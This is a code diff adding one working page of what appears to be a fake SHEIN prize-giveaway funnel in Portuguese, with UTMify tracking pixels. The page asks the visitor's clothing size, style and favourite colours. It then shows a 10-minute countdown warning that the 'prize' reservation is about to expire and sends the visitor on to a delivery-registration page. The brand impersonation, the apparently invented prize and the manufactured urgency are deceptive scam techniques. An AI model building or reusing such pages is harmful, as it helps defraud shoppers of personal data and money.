@@ -1,0 +1,99 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<!-- UTMify Pixel -->
+<script>
+  window.pixelId = "679fb0f4bbdfc9f47bf2c735";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<!-- UTMify UTM -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>SHEIN | Seu Perfil</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/shein.css">
+<script src="js/shared.js"></script>
+</head>
+<body>
+<div id="app-header"></div>
+<main id="app" style="transition:opacity .15s ease"></main>
+<div id="app-footer"></div>
+<script>
+(function(){
+  mountChrome(78);
+  var SM=StepManager('app');
+  var pk=LS.get('funil_premio');
+
+  /* ============ SIZE (only roupas) ============ */
+  SM.add('size',function(){
+    setProgress(78);
+    var sizes=['PP','P','M','G','GG','XG'];
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<span class="pill mb-4" style="background:#f3f4f6;color:#6b7280">SEU PERFIL</span>'
+      +'<h2 class="text-2xl font-extrabold mt-3 mb-2">Qual \u00e9 o seu tamanho?</h2>'
+      +'<p class="text-gray-500 mb-6">Para enviarmos as pe\u00e7as no tamanho ideal para voc\u00ea.</p>'
+      +'<div class="grid grid-cols-3 gap-3">'+sizes.map(function(s){return '<button class="size-btn option-card border-2 border-gray-200 rounded-xl py-5 font-bold text-lg text-gray-700" data-s="'+s+'">'+s+'</button>';}).join('')+'</div>'
+    +'</div>';
+  },function(){
+    document.querySelectorAll('.size-btn').forEach(function(b){b.onclick=function(){LS.set('funil_tamanho',b.getAttribute('data-s'));SM.go('clothing');};});
+  });
+
+  /* ============ CLOTHING DETAIL (open text) ============ */
+  SM.add('clothing',function(){
+    setProgress(80);
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<span class="pill mb-4" style="background:#f3f4f6;color:#6b7280">SEU PERFIL</span>'
+      +'<h2 class="text-2xl font-extrabold mt-3 mb-2">Que tipo de pe\u00e7as voc\u00ea prefere?</h2>'
+      +'<p class="text-gray-500 mb-5">Ex.: vestidos, conjuntos, blusas, jeans... Descreva seu estilo:</p>'
+      +'<textarea id="cl-txt" class="input-field" rows="3" placeholder="Escreva aqui..."></textarea>'
+      +'<button id="cl-cta" class="btn-primary w-full rounded-xl py-4 text-base mt-5 opacity-40" disabled>Continuar</button>'
+    +'</div>';
+  },function(){
+    var t=document.getElementById('cl-txt'),cta=document.getElementById('cl-cta');
+    t.oninput=function(){var ok=t.value.trim().length>=2;cta.disabled=!ok;cta.className='btn-primary w-full rounded-xl py-4 text-base mt-5'+(ok?'':' opacity-40');};
+    t.focus();cta.onclick=function(){if(!cta.disabled)SM.go('colors');};
+  });
+
+  /* ============ COLORS (open text) ============ */
+  SM.add('colors',function(){
+    setProgress(82);
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<span class="pill mb-4" style="background:#f3f4f6;color:#6b7280">SEU PERFIL</span>'
+      +'<h2 class="text-2xl font-extrabold mt-3 mb-2">Quais cores voc\u00ea mais gosta?</h2>'
+      +'<p class="text-gray-500 mb-5">Assim selecionamos itens com a sua cara.</p>'
+      +'<textarea id="co-txt" class="input-field" rows="3" placeholder="Ex.: preto, rosa, tons neutros..."></textarea>'
+      +'<button id="co-cta" class="btn-primary w-full rounded-xl py-4 text-base mt-5 opacity-40" disabled>Continuar</button>'
+    +'</div>';
+  },function(){
+    var t=document.getElementById('co-txt'),cta=document.getElementById('co-cta');
+    t.oninput=function(){var ok=t.value.trim().length>=2;cta.disabled=!ok;cta.className='btn-primary w-full rounded-xl py-4 text-base mt-5'+(ok?'':' opacity-40');};
+    t.focus();cta.onclick=function(){if(!cta.disabled)SM.go('urgency');};
+  });
+
+  /* ============ URGENCY ============ */
+  SM.add('urgency',function(){
+    setProgress(84);
+    return '<div class="step-enter wrap-md px-4 py-10 text-center">'
+      +'<div class="flex justify-center mb-4"><span class="pill pulse-red" style="background:#fee2e2;color:#b91c1c">\u23F0 ATEN\u00C7\u00C3O</span></div>'
+      +'<h2 class="text-2xl font-extrabold mb-3">Sua reserva expira em breve!</h2>'
+      +'<p class="text-gray-600 mb-5">Garantimos o seu pr\u00eamio por tempo limitado. Conclua o cadastro de entrega antes que o tempo acabe:</p>'
+      +'<div class="bg-red-50 border-2 border-red-200 rounded-2xl py-6 mb-6"><div id="urg-timer" class="text-4xl font-extrabold text-red-600 tnum">10:00</div><p class="text-sm text-red-500 mt-1">tempo restante</p></div>'
+      +'<button id="urg-cta" class="btn-primary w-full rounded-xl py-4 text-base">Continuar para entrega \u2192</button>'
+    +'</div>';
+  },function(){
+    var el=document.getElementById('urg-timer');startTimer(el,600,null);
+    document.getElementById('urg-cta').onclick=function(){__funilNav('../entrega/index.html');};
+  });
+
+  /* start: skip size if not roupas */
+  if(pk==='roupas')SM.go('size');else SM.go('clothing');
+})();
+</script>
+
+
+</body></html>
